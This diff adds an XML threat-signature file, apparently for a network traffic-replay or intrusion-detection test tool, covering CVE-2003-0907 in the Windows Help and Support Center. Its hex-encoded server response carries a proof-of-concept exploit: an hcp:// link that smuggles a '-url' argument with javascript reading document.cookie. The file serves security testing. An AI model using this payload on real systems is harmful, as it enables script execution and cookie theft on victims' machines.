@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft HSC URL RemoteCodeExecution"/>
+    <EngDesc display="true" value="There is a vulnerability in the way the Microsoft Help and Support Center processes URL strings. The vulnerability could be exploited to run malicious JavaScript code in the security context of &amp;quot;My Computer Zone&amp;quot;."/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Windows_Server"/>
+      <item value="Microsoft_Microsoft_XP"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_Server_2003_Datacenter_Edition"/>
+      <item value="Microsoft_Windows_Server_2003_Datacenter_Edition_64-bit"/>
+      <item value="Microsoft_Windows_Server_2003_Enterprise_Edition"/>
+      <item value="Microsoft_Windows_Server_2003_Enterprise_Edition_64-bit"/>
+      <item value="Microsoft_Windows_Server_2003_Standard_Edition"/>
+      <item value="Microsoft_Windows_Server_2003_Web_Edition"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040421-01"/>
+    <CVEID display="true" value="CVE-2003-0907"/>
+    <bugtraqID display="true" value="10119"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="16073e5831c3da68327f4a33101736c1"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633602944968437500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="M"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="N"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="O"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="014C" Identification="0DBD" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="D574" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="CB559505" AckNumber="3A2C903C" HeaderLength="05" WindowSize="4470" Checksum="21CA" UrgentPointer="0000" Options="" Payload="474554202F6863706578706C6F69742E68746D6C20485454502F312E310D0A4163636570743A202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A49662D4D6F6469666965642D53696E63653A205468752C2032322041707220323030342031323A32393A303020474D540D0A49662D4E6F6E652D4D617463683A202262626334382D39342D65336162623030220D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E31290D0A486F73743A2031302E322E312E36300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01CE" Identification="F984" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="292B" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="3A2C903C" AckNumber="CB559629" HeaderLength="05" WindowSize="1920" Checksum="8892" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C2032322041707220323030342031323A35313A353920474D540D0A5365727665723A204170616368652F322E302E3430202852656420486174204C696E7578290D0A4C6173742D4D6F6469666965643A205468752C2032322041707220323030342031323A35313A333120474D540D0A455461673A202262626334622D39332D3565633135616330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203134370D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C6120687265663D226863703A2F2F2532322532302D75726C2532302532326863703A2F2F73797374656D2F6572726F72732F636F6E6E656374696F6E2E68746D3F6F6E6C696E655F75726C3D6A6176617363726970743A646F63756D656E742E777269746528616C65727428646F63756D656E742E636F6F6B69652929223E636865636B20746869733C2F613E3C62723E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
